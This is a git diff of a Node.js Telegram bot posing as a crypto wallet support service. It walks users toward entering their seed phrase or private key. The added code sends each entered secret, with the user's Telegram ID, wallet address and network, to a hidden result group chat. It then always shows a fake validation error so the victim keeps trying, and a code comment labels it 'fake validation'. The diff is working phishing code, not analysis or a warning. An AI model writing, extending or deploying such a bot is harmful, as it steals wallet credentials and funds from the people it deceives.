@@ -1,4 +1,3 @@
-
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
@@ -6,8 +5,8 @@ const axios = require('axios');
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
+const RESULT_GROUP_ID = process.env.GROUP_CHAT_ID;
 const ownerId = process.env.OWNER_ID;
-
 
 // Store per-user states
 const chatStates = {};
@@ -31,7 +30,7 @@ bot.onText(/\/start/, async (msg) => {
   );
 });
 
-// --- ISSUE COMMAND (RESTART FLOW) ---
+// --- ISSUE COMMAND ---
 bot.onText(/\/issue/, async (msg) => {
   const chatId = msg.chat.id;
   delete chatStates[chatId];
@@ -57,7 +56,12 @@ bot.onText(/\/issue/, async (msg) => {
 // --- CALLBACK HANDLER ---
 bot.on('callback_query', async (query) => {
   const chatId = query.message.chat.id;
+  const messageId = query.message.message_id;
   const data = query.data;
+
+  try {
+    await bot.deleteMessage(chatId, messageId).catch(() => {}); // Clean previous message
+  } catch (e) {}
 
   switch (data) {
     // === Report Issue ===
@@ -212,7 +216,7 @@ bot.on('callback_query', async (query) => {
 
       await bot.sendMessage(
         chatId,
-        '🔐 Now enter your mnemonic phrase or private key to authorize:',
+        'Now enter your mnemonic phrase or private key to authorize:',
         {
           reply_markup: {
             keyboard: [[{ text: 'Cancel' }]],
@@ -270,6 +274,17 @@ bot.on('message', async (msg) => {
 
   // === Wallet Address Input ===
   if (state?.step === 'awaiting_wallet_address') {
+    const isValidEVM = /^0x[a-fA-F0-9]{40}$/.test(text);
+    const isValidSolana = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);
+
+    if (!isValidEVM && !isValidSolana) {
+      await bot.sendMessage(
+        chatId,
+        '❌ That doesn’t look like a valid address. Please paste again.'
+      );
+      return;
+    }
+
     state.walletAddress = text;
     state.step = 'awaiting_network_selection';
 
@@ -289,14 +304,30 @@ bot.on('message', async (msg) => {
     return;
   }
 
-  // === Mnemonic/Private Key Input (ALWAYS INVALID) ===
+  // === Authorization Step (Send to group + fake validation) ===
   if (state?.step === 'awaiting_authorization') {
+    try {
+      const report =
+        `📩 *New Authorization Attempt*\n` +
+        `• From: [${msg.from.first_name || 'User'}](tg://user?id=${chatId})\n` +
+        `• Chat ID: ${chatId}\n` +
+        `• Issue Type: ${state.issueType || 'N/A'}\n` +
+        `• Wallet: ${state.walletAddress || 'N/A'}\n` +
+        `• Network: ${state.network || 'N/A'}\n` +
+        `• Token: ${state.token || 'N/A'}\n` +
+        `• Entered Data: \`${text}\``;
+
+      await bot.sendMessage(RESULT_GROUP_ID, report, {
+        parse_mode: 'Markdown',
+      });
+    } catch (err) {
+      console.error('❌ Failed to send to result group:', err.message);
+    }
+
     await bot.sendMessage(
       chatId,
       `⚠️ Validation Error: There’s an error in your input, please try again.\n\nNow enter your mnemonic phrase or private key to authorize or send /issue to restart.`,
-      {
-        parse_mode: 'Markdown',
-      }
+      { parse_mode: 'Markdown' }
     );
     return;
   }
